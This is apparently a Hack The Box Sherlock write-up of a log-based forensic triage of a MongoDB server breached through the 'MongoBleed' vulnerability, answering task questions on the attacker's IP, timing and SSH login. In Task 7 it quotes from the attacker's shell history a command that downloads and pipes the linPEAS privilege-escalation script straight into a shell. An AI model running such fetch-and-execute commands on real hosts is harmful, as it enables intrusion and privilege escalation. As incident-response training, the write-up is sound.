---
title: "MangoBleed Writeup"
date: 2026-01-06
categories: [HTB, Writeups, sherlock]
tags: [HTB, Writeups, sherlock, MongoBleed]
---

## **Sherlock Scenario**
You were contacted early this morning to handle a high‑priority incident involving a suspected compromised server. The host, mongodbsync, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as MongoBleed. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.

You have already collected a triage acquisition from the server using UAC. Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, identify any attacker activity (initial access, persistence, privilege escalation, lateral movement, or data access/exfiltration), and summarize your findings with an initial incident assessment and recommended next steps.

## **Task 1**
searching the internet for the mongodbsync mongobleed vulnerability the CVE is **CVE-2025-14847**
> answer: CVE-2025-14847 

## **Task 2**
The affected version of the MongoDB server is **8.0.16**
>answer: 8.0.16

## **Task 3**
navigating to `uac-mongodbsync-linux-triage/[root]/var/log/mongodb` and using the following command `cat mongod.log | grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}" . -r` the ipv4 of the attacker is **65.0.76.43** 
> answer: 65.0.76.43

## **Task 4**
since we know the IP of the attacker I used the following command to better tell when the attacker initiated the attack `grep "65.0.76.43" ./mongod.log | head`
>answer: 2025-12-29 05:25:52

## **Task 5**
since there appears a message the says **"Connection accepted"** and **"Connection ended"** we can look for the word **"Connection"** and use the **wc** command to count how many times have the attacker tried to connect to the server using the following command `grep "Connection" ./mongod.log | wc -l`
> answer: 75260

## **Task 6**
To find the successful login attempt I navigated back to /var/log.auth file and used the following command to look for the answer `cat auth.log | grep "ssh\|65.0.76.43"`
> answer: 2025-12-29 05:40:03

## **Task 7**
For this task I had to navigate to `uac-mongodbsync-linux-triage/[root]/home/mongoadmin` directory and that's to read the **.bash_history** 
> answer:
``` 
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## **Task 8**
For the next question it can be easily answered when reviewing the **cd** movements of the attcker that can be found in the **.bash_history** file
> answer: /var/lib/mongodb